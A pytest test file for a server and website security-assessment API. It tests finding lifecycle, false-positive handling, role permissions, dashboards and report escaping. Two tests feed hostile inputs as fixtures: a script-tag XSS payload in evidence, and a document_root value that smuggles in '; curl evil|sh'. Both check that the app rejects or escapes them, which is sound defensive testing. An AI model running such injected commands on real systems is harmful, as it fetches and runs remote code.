import pytest

from app.assessment import engine
from app.assessment.types import issue, passed
from app.core.enums import FindingCategory as C
from app.core.enums import Role
from app.core.enums import Severity as S

SCRIPT: list[list] = []


@pytest.fixture(autouse=True)
def scripted(monkeypatch):
    """Replace real collection with scripted results, one list per assessment run."""
    SCRIPT.clear()

    def collect(self, asset):
        return SCRIPT.pop(0)

    monkeypatch.setattr(engine._Collector, "collect", collect)


def disk(pct):
    if pct >= 90:
        return issue("disk_usage", C.STORAGE, f"Disk / kritis ({pct}%)", S.HIGH, target="/", value=f"{pct}%")
    if pct >= 80:
        return issue("disk_usage", C.STORAGE, f"Disk / di atas 80%", S.MEDIUM, target="/", value=f"{pct}%")
    return passed("disk_usage", C.STORAGE, "Disk / normal", target="/")


def server(client, headers):
    return client.post("/api/v1/servers", headers=headers, json={"name": "web-01", "hostname": "10.0.0.1"}).json()


def assess(client, headers, asset_id, *results):
    SCRIPT.append(list(results))
    r = client.post(f"/api/v1/assets/{asset_id}/assess", headers=headers)
    assert r.status_code == 202, r.text
    return client.get(f"/api/v1/assessments/{r.json()['id']}", headers=headers).json()


def findings(client, headers, asset_id):
    return client.get(f"/api/v1/findings?asset_id={asset_id}", headers=headers).json()["items"]


def test_status_mapping_and_finding_lifecycle(client, admin):
    s = server(client, admin)

    a1 = assess(client, admin, s["id"], disk(85), passed("memory", C.SYSTEM, "ok"))
    assert a1["state"] == "COMPLETED" and a1["overall_status"] == "YELLOW"
    assert a1["summary"]["diff"]["new"] == 1
    assert [c["check"] for c in a1["checks"]] == ["disk_usage", "memory"]
    assert client.get(f"/api/v1/servers/{s['id']}", headers=admin).json()["status"] == "YELLOW"

    # Same issue, higher severity: same finding updated, not duplicated.
    a2 = assess(client, admin, s["id"], disk(93))
    assert a2["overall_status"] == "RED" and a2["summary"]["diff"]["persistent"] == 1
    [f] = findings(client, admin, s["id"])
    assert f["severity"] == "HIGH" and f["occurrence_count"] == 2

    # Fixed -> auto-resolved, asset back to GREEN.
    a3 = assess(client, admin, s["id"], disk(40))
    assert a3["overall_status"] == "GREEN" and a3["summary"]["diff"]["resolved"] == 1
    assert findings(client, admin, s["id"])[0]["status"] == "RESOLVED"

    # Comes back -> reopened.
    a4 = assess(client, admin, s["id"], disk(88))
    assert a4["summary"]["diff"]["reopened"] == 1
    [f] = findings(client, admin, s["id"])
    assert f["status"] == "OPEN" and f["reopened_count"] == 1

    history = client.get(f"/api/v1/assessments?asset_id={s['id']}", headers=admin).json()
    assert history["total"] == 4  # previous assessments are preserved


def test_errored_check_does_not_resolve_and_makes_yellow(client, admin):
    s = server(client, admin)
    assess(client, admin, s["id"], disk(95))
    from app.assessment.types import error
    a = assess(client, admin, s["id"], error("disk_usage", C.STORAGE, "df failed"))
    assert a["overall_status"] == "YELLOW"
    assert findings(client, admin, s["id"])[0]["status"] == "OPEN"


def test_false_positive_suppresses_status(client, admin, as_role):
    s = server(client, admin)
    assess(client, admin, s["id"], issue("suspicious_process", C.MALWARE, "Proses dari /tmp", S.HIGH,
                                         target="/tmp/backup-agent"))
    [f] = findings(client, admin, s["id"])

    viewer = as_role(Role.VIEWER)
    assert client.post(f"/api/v1/findings/{f['id']}/acknowledge", headers=viewer, json={}).status_code == 403
    assert client.post(f"/api/v1/findings/{f['id']}/false-positive", headers=admin, json={}).status_code == 422
    r = client.post(f"/api/v1/findings/{f['id']}/false-positive", headers=admin,
                    json={"note": "Agent backup resmi milik tim infra"})
    assert r.status_code == 200 and r.json()["status"] == "FALSE_POSITIVE"

    a = assess(client, admin, s["id"], issue("suspicious_process", C.MALWARE, "Proses dari /tmp", S.HIGH,
                                             target="/tmp/backup-agent"))
    assert a["overall_status"] == "GREEN"
    assert a["summary"]["diff"]["suppressed"] == 1
    assert findings(client, admin, s["id"])[0]["status"] == "FALSE_POSITIVE"

    logs = client.get("/api/v1/audit-logs?action=finding.", headers=admin).json()["items"]
    assert logs[0]["details"]["note"] == "Agent backup resmi milik tim infra"


def test_acknowledge_and_reopen(client, admin):
    s = server(client, admin)
    assess(client, admin, s["id"], disk(85))
    [f] = findings(client, admin, s["id"])
    ack = client.post(f"/api/v1/findings/{f['id']}/acknowledge", headers=admin, json={"note": "dijadwalkan"})
    assert ack.json()["status"] == "ACKNOWLEDGED"
    # Acknowledged is not fixed: status stays YELLOW.
    assert assess(client, admin, s["id"], disk(85))["overall_status"] == "YELLOW"
    assert client.post(f"/api/v1/findings/{f['id']}/acknowledge", headers=admin, json={}).status_code == 409
    assert client.post(f"/api/v1/findings/{f['id']}/reopen", headers=admin, json={}).json()["status"] == "OPEN"


def test_report_formats_escape_untrusted_evidence(client, admin, as_role):
    s = server(client, admin)
    evil = "<script>alert('x')</script>"
    a = assess(client, admin, s["id"], issue("malware_file", C.MALWARE, f"Dugaan malware: /var/www/{evil}", S.CRITICAL,
                                             target=f"/var/www/{evil}", evidence={"snippet": evil},
                                             description="Status: SUSPECTED", recommendation="1. Simpan bukti"))
    viewer = as_role(Role.VIEWER)
    html = client.get(f"/api/v1/assessments/{a['id']}/report", headers=viewer)
    assert html.status_code == 200
    assert "<script>" not in html.text and "&lt;script&gt;" in html.text
    assert "default-src 'none'" in html.headers["content-security-policy"]
    assert "CRITICAL" in html.text and "Rekomendasi" in html.text and "SUSPECTED" in html.text

    md = client.get(f"/api/v1/assessments/{a['id']}/report?format=markdown", headers=admin)
    assert md.headers["content-disposition"].startswith("attachment") and "\\<script\\>" in md.text
    js = client.get(f"/api/v1/assessments/{a['id']}/report?format=json", headers=admin).json()
    assert js["assessment"]["overall_status"] == "RED" and js["checks"][0]["severity"] == "CRITICAL"

    logs = client.get("/api/v1/audit-logs?action=report.generate", headers=admin).json()
    assert logs["total"] == 3


def test_permissions_and_conflicts(client, admin, as_role):
    s = server(client, admin)
    assert client.post(f"/api/v1/assets/{s['id']}/assess", headers=as_role(Role.VIEWER)).status_code == 403
    assert client.post(f"/api/v1/assets/{s['id']}/assess", headers=as_role(Role.AUDITOR)).status_code == 403
    SCRIPT.append([disk(10)])
    assert client.post(f"/api/v1/assets/{s['id']}/assess", headers=as_role(Role.OPERATOR)).status_code == 202


def test_running_assessment_blocks_second(client, admin, db, monkeypatch):
    from app.models.assessment import Assessment
    from app.core.enums import AssessmentState
    import uuid
    s = server(client, admin)
    db.add(Assessment(asset_id=uuid.UUID(s["id"]), state=AssessmentState.RUNNING))
    db.commit()
    assert client.post(f"/api/v1/assets/{s['id']}/assess", headers=admin).status_code == 409


def test_run_all_and_dashboard(client, admin):
    s = server(client, admin)
    w = client.post("/api/v1/websites", headers=admin, json={"url": "https://toko.example"}).json()
    SCRIPT.extend([
        [disk(95)],  # server (alphabetical: toko.example < web-01)
        [issue("ssl_certificate", C.SSL, "Sertifikat kedaluwarsa dalam 12 hari", S.MEDIUM, target="https://toko.example"),
         issue("malware_file", C.MALWARE, "Dugaan malware: /x.php", S.CRITICAL, target="/x.php")],
    ])
    SCRIPT.reverse()
    r = client.post("/api/v1/assessments/run-all", headers=admin, json={})
    assert r.json() == {"queued": 2, "skipped_active": 0}

    d = client.get("/api/v1/dashboard/summary", headers=admin).json()
    assert d["status_counts"]["RED"] == 2
    assert d["malware_suspected"] == 1 and d["ssl_expiring"] == 1 and d["disk_critical"] == 1
    assert d["unresolved_findings"] == 3 and d["open_findings"]["CRITICAL"] == 1
    assert d["never_assessed"] == 0 and d["last_assessment_at"]
    assert {a["name"] for a in d["red_assets"]} == {"web-01", "toko.example"}
    assert w["id"] and s["id"]


def test_document_root_validation(client, admin):
    r = client.post("/api/v1/websites", headers=admin,
                    json={"url": "https://a.example", "document_root": "/var/www/a; curl evil|sh"})
    assert r.status_code == 422
    r = client.post("/api/v1/websites", headers=admin,
                    json={"url": "https://a.example", "document_root": "/var/www/a.example/public/"})
    assert r.status_code == 201 and r.json()["document_root"] == "/var/www/a.example/public"


def test_status_function():
    assert engine.overall_status([passed("x", C.SYSTEM, "ok")]).value == "GREEN"
    assert engine.overall_status([issue("x", C.SYSTEM, "low", S.LOW)]).value == "YELLOW"
    assert engine.overall_status([issue("x", C.SYSTEM, "hi", S.HIGH)]).value == "RED"
